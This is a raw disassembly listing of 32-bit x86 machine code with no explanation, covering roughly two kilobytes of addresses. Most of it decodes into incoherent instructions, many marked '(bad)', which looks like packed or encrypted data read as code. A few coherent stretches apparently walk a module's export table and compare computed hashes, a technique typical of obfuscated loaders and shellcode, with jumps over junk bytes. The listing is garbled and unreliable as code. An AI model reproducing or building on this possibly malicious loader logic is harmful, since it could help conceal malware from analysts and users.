  40ec2b:	xor    eax,DWORD PTR [edx]
  40ec2d:	fwait
  40ec2e:	repz call 0x2848:0x6f07edf2
  40ec36:	je     0x40ec57
  40ec38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec39:	cmc    
  40ec3a:	call   DWORD PTR [ecx-0x2f8822f2]
  40ec40:	sbb    eax,0x76d40144
  40ec45:	fwait
  40ec46:	adc    DWORD PTR [eax+0x53c4762],0xffffffd8
  40ec4d:	test   DWORD PTR [edi],esp
  40ec4f:	in     al,dx
  40ec50:	jb     0x40ec2c
  40ec52:	jbe    0x40ec76
  40ec54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec55:	ins    BYTE PTR es:[edi],dx
  40ec56:	xor    eax,DWORD PTR [ebx-0x48]
  40ec59:	aas    
  40ec5a:	and    BYTE PTR [eax+eiz*1],0x39
  40ec5e:	mov    ecx,0xd7c5126d
  40ec63:	inc    edi
  40ec64:	and    dl,BYTE PTR [ebx]
  40ec66:	xchg   DWORD PTR es:[ecx-0x2fb0cc76],ecx
  40ec6d:	mov    ds:0xe65ef8eb,al
  40ec72:	and    DWORD PTR [eax-0x8c22f86],0x66f325a3
  40ec7c:	(bad)  
  40ec7d:	retf   0x5141
  40ec80:	sub    al,0x9e
  40ec82:	adc    cl,BYTE PTR [eax-0x5a7c04a2]
  40ec88:	ds enter 0xa2fd,0x22
  40ec8d:	mov    eax,ds:0xfe819d43
  40ec92:	(bad)  
  40ec93:	stos   DWORD PTR es:[edi],eax
  40ec94:	stc    
  40ec95:	mov    esi,0x5d766fb6
  40ec9a:	rcl    DWORD PTR [edx-0x5e605add],0x34
  40eca1:	sbb    eax,0x5caa804a
  40eca6:	loop   0x40ecbe
  40eca8:	sar    DWORD PTR [ebp+0x33e9e2c1],cl
  40ecae:	cmc    
  40ecaf:	pop    esi
  40ecb0:	ror    BYTE PTR [ecx-0x628cd02],cl
  40ecb6:	call   0x15f29d3b
  40ecbb:	ds mov ch,0xd1
  40ecbe:	aaa    
  40ecbf:	sbb    eax,0xdf6079ad
  40ecc4:	pop    ebp
  40ecc5:	call   0xada85929
  40ecca:	xchg   BYTE PTR ds:[edi],dl
  40eccd:	and    edi,esp
  40eccf:	lea    edx,[edi-0x4eb86ecd]
  40ecd5:	dec    ebx
  40ecd6:	out    0xc2,al
  40ecd8:	sbb    ebp,edx
  40ecda:	ins    DWORD PTR es:[edi],dx
  40ecdb:	lds    ebp,FWORD PTR [eax+0x10c021f1]
  40ece1:	cli    
  40ece2:	or     eax,0x45890244
  40ece7:	in     al,dx
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx+0xc0ff277],eax
  40ed29:	bound  eax,QWORD PTR [esi+eiz*4]
  40ed2c:	jo     0x40ed9e
  40ed2e:	dec    ecx
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ed53
  40ed33:	enter  0x2f0,0x3f
  40ed37:	push   ss
  40ed38:	in     eax,dx
  40ed39:	imul   edx,DWORD PTR [esi+0x7ae03ff0],0x57ad2e89
  40ed43:	loope  0x40ecee
  40ed45:	pop    ebp
  40ed46:	xor    al,0x34
  40ed48:	mov    ah,0x94
  40ed4a:	inc    esi
  40ed4b:	xchg   esp,eax
  40ed4c:	sub    BYTE PTR [ecx+0x2b40078d],ch
  40ed52:	push   edx
  40ed53:	test   al,0xa6
  40ed55:	pop    ss
  40ed56:	xor    al,0xef
  40ed58:	cli    
  40ed59:	sahf   
  40ed5a:	xor    DWORD PTR [esi-0x45],esi
  40ed5d:	int    0x33
  40ed5f:	(bad)
  40ed62:	dec    edi
  40ed63:	mov    eax,ds:0xe83e118b
  40ed68:	xchg   BYTE PTR [ebx+ebx*1+0x238775ce],bh
  40ed6f:	sub    eax,0xd8945e13
  40ed74:	jl     0x40ed97
  40ed76:	(bad)  
  40ed77:	cmc    
  40ed78:	(bad)  [ebx-0x80]
  40ed7b:	jb     0x40ed7c
  40ed7d:	mul    DWORD PTR [ebx+0x3e447693]
  40ed83:	push   ds
  40ed84:	push   esp
  40ed85:	sbb    DWORD PTR ds:0xb20f007d,edi
  40ed8b:	sbb    BYTE PTR [ebx],ch
  40ed8d:	out    0xc0,al
  40ed8f:	call   0xad7d66fa
  40ed94:	das    
  40ed95:	fistp  WORD PTR [edx+0x6915bc8d]
  40ed9b:	dec    ecx
  40ed9c:	mov    ebp,0xf6f74cd7
  40eda1:	pop    es
  40eda2:	xchg   edx,eax
  40eda3:	add    eax,ebp
  40eda5:	push   edx
  40eda6:	dec    esp
  40eda7:	out    0x79,al
  40eda9:	jne    0x40edcf
  40edab:	xchg   esp,eax
  40edac:	fcmove st,st(1)
  40edae:	jno    0x40edc3
  40edb0:	ffreep st(0)
  40edb2:	xchg   edx,eax
  40edb3:	dec    edx
  40edb4:	fwait
  40edb5:	sbb    al,0x2e
  40edb7:	test   eax,0xd3dd1491
  40edbc:	outs   dx,DWORD PTR ds:[esi]
  40edbd:	mov    esi,0xfb5acc8f
  40edc2:	outs   dx,DWORD PTR es:[esi]
  40edc4:	or     edx,esi
  40edc6:	add    al,0xa6
  40edc8:	enter  0xafab,0x40
  40edcc:	jo     0x40ee4c
  40edce:	push   0x9
  40edd0:	lds    edx,FWORD PTR [edx-0x1c9143fe]
  40edd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edd7:	sbb    ecx,DWORD PTR [ebx+esi*8-0x21]
  40eddb:	pop    edx
  40eddc:	sahf   
  40eddd:	or     DWORD PTR [edx],0xffffffd0
  40ede0:	and    dh,BYTE PTR [eax-0x4c7fa09b]
  40ede6:	lods   eax,DWORD PTR ds:[esi]
  40ede7:	dec    eax
  40ede8:	test   eax,eax
  40edea:	adc    al,0x3a
  40edec:	pop    ebp
  40eded:	cmc    
  40edee:	jg     0x40ee13
  40edf0:	xchg   esp,esi
  40edf2:	add    BYTE PTR [esi+edx*8-0x79],cl
  40edf6:	pop    ebp
  40edf7:	sbb    bh,BYTE PTR [edx+eax*1]
  40edfa:	scas   eax,DWORD PTR es:[edi]
  40edfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edfc:	pop    ds
  40edfd:	clc    
  40edfe:	adc    DWORD PTR [ebp+0x32ddc465],esi
  40ee04:	sbb    BYTE PTR [esi],ah
  40ee06:	sbb    dh,BYTE PTR [eax]
  40ee08:	fldcw  WORD PTR [esi+eax*2-0x67]
  40ee0c:	in     al,dx
  40ee0d:	lods   al,BYTE PTR ds:[esi]
  40ee0e:	daa    
  40ee0f:	pop    ebx
  40ee10:	mov    eax,ds:0xedb48965
  40ee15:	pop    edx
  40ee16:	mov    cl,0x77
  40ee18:	pop    dx
  40ee1a:	add    DWORD PTR [edi],esi
  40ee1c:	inc    esi
  40ee1d:	cwde   
  40ee1e:	(bad)  
  40ee1f:	js     0x40ee75
  40ee21:	cmp    edi,DWORD PTR [edx-0x70]
  40ee24:	rcr    BYTE PTR [ecx+0x4580af34],1
  40ee2a:	mov    dh,0x6c
  40ee2c:	aam    0x44
  40ee2e:	fst    QWORD PTR [edi]
  40ee30:	push   esi
  40ee31:	jg     0x40ee82
  40ee33:	adc    BYTE PTR [eax],cl
  40ee35:	aam    0xa
  40ee37:	lods   al,BYTE PTR ds:[esi]
  40ee38:	cmp    al,0x3e
  40ee3a:	shl    DWORD PTR [edx+0x16],0x5
  40ee3e:	mov    ah,0x9a
  40ee40:	loopne 0x40ee5a
  40ee42:	adc    eax,0xdb1fea57
  40ee47:	xor    eax,0x9904b0e0
  40ee4c:	hlt    
  40ee4d:	ror    BYTE PTR [edi+0x60],1
  40ee50:	push   0x769586d8
  40ee55:	frstor [ebx+ecx*8-0x17f2163d]
  40ee5c:	cwde   
  40ee5d:	push   ds
  40ee5e:	out    0x57,eax
  40ee60:	cmp    DWORD PTR [ecx+0xbd39287],ebp
  40ee66:	mov    ah,0xeb
  40ee68:	push   edi
  40ee69:	mov    edx,0xae0e86df
  40ee6e:	jbe    0x40eebc
  40ee70:	xor    al,BYTE PTR [edi+0x454f4aa9]
  40ee76:	or     esi,DWORD PTR [ebp-0x58]
  40ee79:	mov    eax,ds:0x975885b6
  40ee7e:	scas   eax,DWORD PTR es:[edi]
  40ee7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee80:	ret    0xd349
  40ee83:	pop    ds
  40ee84:	and    al,0xb
  40ee87:	test   al,0x79
  40ee89:	and    ah,0x41
  40ee8c:	les    edx,FWORD PTR [edi-0x30]
  40ee8f:	gs test eax,0xe1360216
  40ee95:	xlat   BYTE PTR ds:[ebx]
  40ee96:	lds    esp,FWORD PTR [ebx+0x57]
  40ee99:	clc    
  40ee9a:	test   edx,edx
  40ee9c:	sbb    cl,BYTE PTR [edx+0x662f0ede]
  40eea2:	cmp    BYTE PTR [esi],0x5
  40eea5:	hlt    
  40eea6:	xor    BYTE PTR [ebx-0x15],bl
  40eea9:	les    edx,FWORD PTR [ebx+0x7c]
  40eeac:	push   ss
  40eead:	pop    edx
  40eeae:	mov    edx,ecx
  40eeb0:	sbb    ebx,ecx
  40eeb2:	xlat   BYTE PTR ds:[ebx]
  40eeb3:	xchg   edi,eax
  40eeb4:	and    eax,0xed4a660b
  40eeb9:	xchg   edx,eax
  40eeba:	jp     0x40ef0c
  40eebc:	jge    0x40ef00
  40eebe:	push   cs
  40eebf:	ja     0x40eeb0
  40eec1:	fwait
  40eec2:	loop   0x40eeac
  40eec4:	leave  
  40eec5:	lock xchg ebp,eax
  40eec7:	js     0x40ee53
  40eec9:	sub    esi,esp
  40eecb:	ret    0x6f9c
  40eece:	pop    es
  40eecf:	hlt    
  40eed0:	push   eax
  40eed1:	rcr    DWORD PTR [edi],1
  40eed3:	outs   dx,BYTE PTR ds:[esi]
  40eed4:	sbb    DWORD PTR [esp+ebx*2+0x47bceda3],ebx
  40eedb:	sub    bl,ah
  40eedd:	adc    al,BYTE PTR [esi+0x85679a9]
  40eee3:	mov    bl,0x74
  40eee5:	or     ebx,DWORD PTR gs:[esi-0x65]
  40eee9:	lods   al,BYTE PTR ds:[esi]
  40eeea:	jp     0x40ef16
  40eeec:	out    dx,al
  40eeed:	scas   al,BYTE PTR es:[edi]
  40eeee:	cmp    al,BYTE PTR [eax+0x32]
  40eef1:	fs int 0xf
  40eef4:	cld    
  40eef5:	fcomp  DWORD PTR [ebx+edx*8]
  40eef8:	in     eax,dx
  40eef9:	dec    ecx
  40eefa:	push   ecx
  40eefb:	add    edx,DWORD PTR [edi-0x5aeeb4c7]
  40ef01:	cmp    bl,BYTE PTR [edx-0x28c3df27]
  40ef07:	icebp  
  40ef08:	mov    DWORD PTR [edx+0x624f8d1d],ebx
  40ef0e:	xchg   DWORD PTR [ecx],ebp
  40ef10:	mov    esi,0x856a539a
  40ef15:	push   esp
  40ef16:	xchg   ebx,eax
  40ef17:	in     al,0x52
  40ef19:	add    DWORD PTR [edi],ecx
  40ef1b:	inc    esp
  40ef1c:	lock inc ebp
  40ef1e:	pop    edx
  40ef1f:	sbb    al,0x6a
  40ef21:	fstp   QWORD PTR [ebp+ebp*1-0x14]
  40ef25:	add    esi,DWORD PTR gs:[ebx]
  40ef28:	xor    al,0xf2
  40ef2a:	add    BYTE PTR [ebx],ch
  40ef2c:	or     eax,ebx
  40ef2e:	xor    BYTE PTR [eax],al
  40ef30:	push   eax
  40ef31:	inc    esp
  40ef32:	xchg   edi,eax
  40ef33:	fimul  DWORD PTR [ecx+esi*8-0xc]
  40ef37:	cmc    
  40ef38:	sahf   
  40ef39:	(bad)  
  40ef3a:	idiv   BYTE PTR [ebx*2+0x2694dfbc]
  40ef41:	lods   al,BYTE PTR ds:[esi]
  40ef42:	ret    0x8bb3
  40ef45:	in     al,0xee
  40ef47:	fucom  st(7)
  40ef49:	popa   
  40ef4a:	mov    dl,0xfd
  40ef4c:	or     BYTE PTR [edx+0x9ecb596],ch
  40ef52:	add    al,0x4c
  40ef54:	mov    ebx,0x6e060f78
  40ef59:	pushf  
  40ef5a:	fs in  al,dx
  40ef5c:	push   es
  40ef5d:	scas   eax,DWORD PTR es:[edi]
  40ef5e:	xor    ecx,eax
  40ef60:	jecxz  0x40ef69
  40ef62:	mov    eax,0x3be598b5
  40ef67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef68:	nop
  40ef69:	not    BYTE PTR [edx-0x8]
  40ef6c:	(bad)  
  40ef6d:	mov    WORD PTR [eax],ss
  40ef6f:	js     0x40ef04
  40ef71:	fdivr  QWORD PTR [ebp+ebp*1-0x2b]
  40ef75:	fmul   QWORD PTR [edx+0x24]
  40ef78:	ins    DWORD PTR es:[edi],dx
  40ef79:	je     0x40ef47
  40ef7b:	and    eax,0xc2696013
  40ef80:	fdiv   QWORD PTR [ebx+esi*2]
  40ef83:	mov    al,ds:0xfad760a3
  40ef88:	pop    edx
  40ef89:	cmp    al,0x9
  40ef8b:	lahf   
  40ef8c:	jmp    0x40efd0
  40ef8e:	in     eax,0x9d
  40ef90:	mov    dl,0x61
  40ef92:	es sub al,0xf2
  40ef95:	in     eax,0x50
  40ef97:	jge    0x40ef48
  40ef99:	dec    eax
  40ef9a:	sbb    ah,al
  40ef9c:	adc    dh,BYTE PTR [ecx]
  40ef9e:	lea    edi,ds:0xc13f3039
  40efa4:	xor    BYTE PTR [edi+0x7d],bl
  40efa7:	fild   DWORD PTR [ebx]
  40efa9:	and    eax,eax
  40efab:	cdq    
  40efac:	(bad)  
  40efad:	jmp    0x3ff6:0xd86d698
  40efb4:	leave  
  40efb5:	and    eax,0x137e2859
  40efba:	xor    dl,BYTE PTR ds:0xcc8f2bc7
  40efc0:	pop    ebx
  40efc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efc2:	mov    BYTE PTR [ebx-0x76523b39],ah
  40efc8:	test   dl,ch
  40efca:	fistp  QWORD PTR [edi]
  40efcc:	xchg   BYTE PTR [ecx+0x10cbbbd0],cl
  40efd2:	leave  
  40efd3:	(bad)  
  40efd4:	mov    dl,bl
  40efd6:	out    0x90,eax
  40efd8:	dec    ebp
  40efd9:	repz sub eax,0x1f59e965
  40efdf:	and    BYTE PTR [edx+0x608d9c2b],ch
  40efe5:	push   esi
  40efe6:	xor    eax,0xd93214be
  40efeb:	repnz lock lea ebx,[edi+edi*1+0x1a]
  40eff1:	xor    al,0x2d
  40eff3:	frstor [edi-0x54]
  40eff6:	dec    eax
  40eff7:	fcmovnbe st,st(4)
  40eff9:	mov    bl,0x44
  40effb:	adc    edi,DWORD PTR [ebx+0x19]
  40effe:	xchg   ecx,eax
  40efff:	adc    ebx,edx
  40f001:	lahf   
  40f002:	popf   
  40f003:	loopne 0x40ef9b
  40f005:	fisub  WORD PTR ds:0xf2739c9d
  40f00b:	add    ecx,esp
  40f00d:	or     ebx,ebp
  40f00f:	mov    esp,0x92d49fea
  40f014:	push   0xffffffc8
  40f016:	loop   0x40effa
  40f018:	mov    ecx,0x63e1cda5
  40f01d:	fnstcw WORD PTR [esi-0x10]
  40f020:	imul   ebx,DWORD PTR [esi],0x4b592d0d
  40f026:	stc    
  40f027:	mov    bh,0x9a
  40f029:	dec    esp
  40f02a:	or     eax,0xc9260e5b
  40f02f:	ret    
  40f030:	xor    al,0xcc
  40f032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f033:	fimul  DWORD PTR [edi]
  40f035:	and    al,0x3c
  40f037:	adc    eax,0x661188a2
  40f03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f03d:	fs aaa 
  40f03f:	sti    
  40f040:	inc    eax
  40f041:	or     ah,BYTE PTR [edi]
  40f043:	les    esp,FWORD PTR [ebp+0x7]
  40f046:	sbb    ah,bh
  40f048:	cmp    BYTE PTR [ecx+0x72f269c7],bh
  40f04e:	push   esp
  40f04f:	xchg   edi,eax
  40f050:	mov    edx,0xe7d51c04
  40f055:	call   0x838d:0xe40430cf
  40f05c:	cwde   
  40f05d:	xor    eax,0x64d7df3d
  40f062:	retf   0x5ccb
  40f065:	add    BYTE PTR [ecx-0x1ffccf54],0x7d
  40f06c:	mov    dh,0xe0
  40f06e:	mov    eax,0x6cf05b6e
  40f073:	retf   
  40f074:	push   edx
  40f075:	pop    ss
  40f076:	xchg   edx,eax
  40f077:	adc    DWORD PTR [edx],edi
  40f079:	hlt    
  40f07a:	jns    0x40f08f
  40f07c:	cs mov dl,0xa7
  40f07f:	imul   edi,DWORD PTR [edi+0x3433169d],0x2d42e11c
  40f089:	aas    
  40f08a:	cs call 0x358c:0x1709cded
  40f092:	jge    0x40f048
  40f094:	jg     0x40f01d
  40f096:	ja     0x40f0ec
  40f098:	pmullw mm4,mm6
  40f09b:	sub    BYTE PTR [edi],dl
  40f09d:	dec    edx
  40f09e:	loopne 0x40f05b
  40f0a0:	addr16 (bad) 
  40f0a2:	int3   
  40f0a3:	loopne 0x40f0db
  40f0a5:	adc    eax,0x461a12a5
  40f0aa:	jb     0x40f0ce
  40f0ac:	sbb    eax,0x4c1ae9c5
  40f0b1:	inc    eax
  40f0b2:	lods   eax,DWORD PTR ds:[esi]
  40f0b3:	jg     0x40f080
  40f0b5:	jb     0x40f041
  40f0b7:	(bad)  
  40f0b9:	jle    0x40f097
  40f0bb:	in     eax,dx
  40f0bc:	adc    BYTE PTR [esi-0x53a1d0a2],0x8b
  40f0c3:	push   cs
  40f0c4:	sbb    ecx,DWORD PTR [ebx]
  40f0c6:	loop   0x40f0f5
  40f0c8:	int    0xc8
  40f0ca:	mov    BYTE PTR [edi],bh
  40f0cc:	inc    esp
  40f0cd:	(bad)  
  40f0ce:	jg     0x40f0ee
  40f0d0:	mov    edi,0x2adb9324
  40f0d5:	dec    ebp
  40f0d6:	cmp    eax,0x3efbfb13
  40f0db:	pop    esp
  40f0dc:	cmp    al,BYTE PTR [ecx-0x19]
  40f0df:	int    0x57
  40f0e1:	loope  0x40f0ac
  40f0e3:	repnz int3 
  40f0e5:	in     al,dx
  40f0e6:	mov    esi,DWORD PTR [ebx-0xa]
  40f0e9:	dec    ebx
  40f0ea:	sbb    cl,al
  40f0ec:	aas    
  40f0ed:	out    dx,eax
  40f0ee:	add    eax,0xfc356d2b
  40f0f3:	push   esp
  40f0f4:	fwait
  40f0f5:	or     bh,BYTE PTR [edi+0x5b]
  40f0f8:	iret   
  40f0f9:	je     0x40f170
  40f0fb:	cmc    
  40f0fc:	iret   
  40f0fd:	fwait
  40f0fe:	mov    esi,DWORD PTR [eax+ebx*8+0x37]
  40f102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f103:	mul    BYTE PTR [edi-0x3d]
  40f106:	add    BYTE PTR [esi+0x244803d9],0x89
  40f10d:	dec    ebp
  40f10e:	aam    0x8b
  40f110:	inc    ebp
  40f111:	in     al,dx
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0x83
  40f12a:	xchg   BYTE PTR [esp+ebx*2+0x7070a35d],ah
  40f131:	dec    ecx
  40f132:	jge    0x40f1a4
  40f134:	jo     0x40f0f1
  40f136:	mov    ah,0x84
  40f138:	mov    ds:0x3f48b47,eax
  40f13d:	push   edx
  40f13e:	out    dx,eax
  40f13f:	or     ebx,DWORD PTR [eax]
  40f141:	mov    bh,0x85
  40f143:	nop
  40f144:	lods   al,BYTE PTR gs:[esi]
  40f146:	xor    dl,BYTE PTR [ecx-0x18]
  40f149:	pop    ecx
  40f14a:	(bad)  
  40f14b:	mov    eax,ds:0xe6e9edcd
  40f150:	call   0x6aad6a9
  40f155:	mov    bl,0x15
  40f157:	fisub  WORD PTR [ebx]
  40f159:	sbb    bh,BYTE PTR [eax+eiz*2]
  40f15c:	lea    ecx,[eax-0x68b28d31]
  40f162:	in     eax,0x3b
  40f164:	sub    al,0x5
  40f166:	and    DWORD PTR [esi+ebx*2],esp
  40f169:	push   esi
  40f16a:	xchg   esi,eax
  40f16b:	sub    al,0xc5
  40f16d:	and    ah,ch
  40f16f:	mov    dl,0xd4
  40f171:	mov    ds:0x5227a2af,eax
  40f176:	sar    DWORD PTR [esi-0x35c0219e],0xea
  40f17d:	mov    ecx,0x4197c239
  40f182:	adc    dl,BYTE PTR [eax+0x1af2da39]
  40f188:	and    BYTE PTR [ecx],bl
  40f18a:	retf   
  40f18b:	js     0x40f140
  40f18d:	sbb    edi,DWORD PTR [ebx+0x529fa3be]
  40f193:	jno    0x40f144
  40f195:	push   esi
  40f196:	and    bh,BYTE PTR [edx+0x36]
  40f199:	lahf   
  40f19a:	ins    BYTE PTR es:[edi],dx
  40f19b:	(bad)  
  40f19c:	xchg   ebp,eax
  40f19d:	sub    al,0xfc
  40f19f:	jle    0x40f193
  40f1a1:	inc    edx
  40f1a2:	test   al,0x78
  40f1a4:	push   ss
  40f1a5:	std    
  40f1a6:	pop    ebx
  40f1a7:	and    DWORD PTR [ecx+ebp*4+0x4c3ba45],esi
  40f1ae:	sbb    BYTE PTR [esi],cl
  40f1b0:	push   ebp
  40f1b1:	sbb    al,0xc6
  40f1b3:	push   ebx
  40f1b4:	adc    eax,0x29c1685c
  40f1b9:	push   eax
  40f1ba:	xchg   esp,eax
  40f1bb:	(bad)  
  40f1bc:	lds    edx,FWORD PTR [eax-0x7e]
  40f1bf:	jge    0x40f1be
  40f1c1:	sub    BYTE PTR ds:[ecx],al
  40f1c4:	es push edi
  40f1c6:	inc    eax
  40f1c7:	adc    edi,esi
  40f1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ca:	mov    al,0x16
  40f1cc:	rcl    DWORD PTR [esi],0xa7
  40f1cf:	aam    0x9
  40f1d1:	sub    eax,0x1a19cd0b
  40f1d6:	int3   
  40f1d7:	mov    dl,BYTE PTR [ebx]
  40f1d9:	out    0x5a,al
  40f1db:	or     eax,0x2d34f776
  40f1e0:	ss push ds
  40f1e2:	and    DWORD PTR [eax],ecx
  40f1e4:	mov    ecx,DWORD PTR [esi+0x17abc1e4]
  40f1ea:	push   edx
  40f1eb:	callw  0xfce7
  40f1ef:	ss dec ebp
  40f1f1:	sbb    ah,BYTE PTR [eax+ebx*8-0x681aa636]
  40f1f8:	jns    0x40f22d
  40f1fa:	retf   
  40f1fb:	push   es
  40f1fc:	pop    edx
  40f1fd:	dec    esi
  40f1fe:	sti    
  40f1ff:	and    DWORD PTR [edx],esp
  40f201:	pop    esp
  40f202:	adc    dl,ah
  40f204:	mov    eax,0x855b3fd1
  40f209:	in     eax,dx
  40f20a:	cmp    dl,bh
  40f20c:	lds    edi,FWORD PTR [ecx-0x212a257e]
  40f212:	ja     0x40f210
  40f214:	pop    edi
  40f215:	xchg   BYTE PTR [eax+0x82d0f3b],bh
  40f21b:	push   ds
  40f21c:	pop    ss
  40f21d:	xchg   DWORD PTR [eax],edi
  40f21f:	fcomp  DWORD PTR [edx-0x1e]
  40f222:	scas   eax,DWORD PTR es:[edi]
  40f223:	aaa    
  40f224:	call   0x1af1:0x55558d3e
  40f22b:	daa    
  40f22c:	repnz cmp ecx,DWORD PTR [ebx-0x7f00ef52]
  40f233:	shl    DWORD PTR [edx+ebp*8],cl
  40f236:	clc    
  40f237:	xchg   ecx,eax
  40f238:	dec    esi
  40f239:	and    al,0x8f
  40f23b:	aaa    
  40f23c:	inc    ebp
  40f23d:	and    BYTE PTR [ebp-0x57],0x12
  40f241:	pushf  
  40f242:	ror    DWORD PTR [edi-0x40493eb],1
  40f248:	cmp    DWORD PTR [ebp-0x4a],0xffffffca
  40f24c:	xchg   DWORD PTR [edx+edi*4-0x1b7d5b1b],ebx
  40f253:	xchg   DWORD PTR [esi-0x59e6a017],ecx
  40f259:	retf   
  40f25a:	fs push es
  40f25c:	mov    ecx,ebx
  40f25e:	outs   dx,BYTE PTR ds:[esi]
  40f25f:	xor    al,0x57
  40f261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f262:	fwait
  40f263:	mov    ecx,0x182b38ba
  40f268:	out    0xd5,al
  40f26a:	inc    ebx
  40f26b:	mov    ds:0x1aa2a5e4,eax
  40f270:	das    
  40f271:	into   
  40f272:	sahf   
  40f273:	inc    edi
  40f274:	dec    ebx
  40f275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f276:	push   0xc962780b
  40f27b:	mov    ch,0x97
  40f27d:	aad    0xef
  40f27f:	sahf   
  40f280:	push   eax
  40f281:	xchg   esi,eax
  40f282:	or     eax,0x6d2b2d93
  40f287:	repnz (bad) 
  40f289:	arpl   WORD PTR [esi+0x2e6018f6],cx
  40f28f:	push   es
  40f290:	mov    WORD PTR [ecx+0x22],ds
  40f293:	and    esp,DWORD PTR [ebp+0x32c1b87d]
  40f299:	mov    al,ah
  40f29b:	or     ebp,DWORD PTR [esi-0x16]
  40f29e:	mov    ch,0x4c
  40f2a0:	shl    ch,0x84
  40f2a3:	leave  
  40f2a4:	mov    cl,BYTE PTR [ebx-0x1e5fd899]
  40f2aa:	add    eax,0x9760cdce
  40f2af:	pop    ss
  40f2b0:	ret    0xf02d
  40f2b3:	es cli 
  40f2b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b6:	cli    
  40f2b7:	sar    BYTE PTR [edx-0x65590e0f],0x2e
  40f2be:	rol    DWORD PTR [esi-0x3c],0xb3
  40f2c2:	loope  0x40f298
  40f2c4:	les    esp,FWORD PTR [ebx+edx*2-0x5b]
  40f2c8:	dec    edi
  40f2c9:	shl    DWORD PTR [ebx-0x66],0x84
  40f2cd:	sub    ebx,0xbfd92c2e
  40f2d3:	mov    ah,0xa
  40f2d5:	popa   
  40f2d6:	js     0x40f272
  40f2d8:	das    
  40f2d9:	pop    ds
  40f2da:	push   esi
  40f2db:	jns    0x40f2eb
  40f2dd:	es push es
  40f2df:	push   esi
  40f2e0:	dec    esp
  40f2e1:	push   cs
  40f2e2:	fwait
  40f2e3:	push   es
  40f2e4:	jmp    0x40f30d
  40f2e6:	or     ebp,DWORD PTR [edx]
  40f2e8:	jae    0x40f2c6
  40f2ea:	xor    DWORD PTR [ebx-0x2],edi
  40f2ed:	push   ebx
  40f2ee:	dec    ecx
  40f2ef:	sbb    BYTE PTR [ecx],0xa9
  40f2f2:	or     DWORD PTR [ecx-0x3b451e86],0x2b790fd4
  40f2fc:	ss daa 
  40f2fe:	shl    esi,cl
  40f300:	xchg   esi,eax
  40f301:	jge    0x40f2a3
  40f303:	push   edx
  40f304:	and    bl,ah
  40f306:	cmp    DWORD PTR [esp+edi*4],eax
  40f309:	mov    BYTE PTR [ebp+0x41],dh
  40f30c:	rol    DWORD PTR [edx+0x1fbc16e5],cl
  40f312:	mov    cs,WORD PTR [esi-0x685e7de0]
  40f318:	gs adc al,0x8c
  40f31b:	sbb    al,0x16
  40f31d:	adc    al,0xe7
  40f31f:	mov    dl,0x8a
  40f321:	popa   
  40f322:	test   eax,0x9db22806
  40f327:	or     dl,BYTE PTR [ecx+ebx*4+0x5c57a8eb]
  40f32e:	enter  0x8917,0xa
  40f332:	loopne 0x40f330
  40f334:	xchg   DWORD PTR [edx],ebp
  40f336:	in     al,dx
  40f337:	cmp    esi,DWORD PTR [ecx]
  40f339:	lea    edi,[esi+eax*4-0x7bfcab12]
  40f340:	mov    ds:0xc645556e,eax
  40f345:	fsubr  QWORD PTR [ecx+0x7d]
  40f348:	push   es
  40f349:	(bad)  
  40f34a:	adc    esp,DWORD PTR [ebp+0x47]
  40f34d:	pop    ebx
  40f34e:	adc    BYTE PTR [ecx+0x5a3f22b9],bl
  40f354:	inc    edx
  40f355:	shr    BYTE PTR [ecx+ecx*1-0x1507f998],0xca
  40f35d:	(bad)  
  40f35e:	lods   eax,DWORD PTR ds:[esi]
  40f35f:	(bad)  
  40f360:	ror    BYTE PTR [ebx-0x4101c8d4],1
  40f366:	and    DWORD PTR [ebx+esi*1-0x1d],edi
  40f36a:	call   0x83be72dd
  40f36f:	test   ch,0xf3
  40f372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f373:	lea    eax,[eax]
  40f375:	mov    edi,0x4b2bc7d1
  40f37a:	aam    0xb9
  40f37c:	inc    ebp
  40f37d:	mov    bl,0x13
  40f37f:	fdivr  DWORD PTR [edx]
  40f381:	mov    ah,BYTE PTR [edi-0x7c]
  40f384:	fist   DWORD PTR [eax-0x3560d0a7]
  40f38a:	ret    0x1718
  40f38d:	enter  0x20a7,0x8e
